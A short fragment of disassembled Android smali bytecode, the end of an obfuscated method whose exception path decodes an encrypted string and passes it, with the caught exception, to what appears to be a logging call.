    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 476
    .line 477
    .line 478
    goto :goto_2

    .line 479
    :goto_1
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 480
    .line 481
    const-string/jumbo v0, "tj+e9ATM54GvD4X/FNrf04ITvv4Q2uuFiF0JJ/FaOks=\n"

    .line 482
    .line 483
    .line 484
    const-string v1, "7X3sm3O/gvM=\n"

    .line 485
    .line 486
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 487
    .line 488
    .line 489
    move-result-object v0

    .line 490
    invoke-virtual {p2, v0, p1}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 491
    .line 492
    .line 493
    :cond_9
    :goto_2
    return-void
.end method
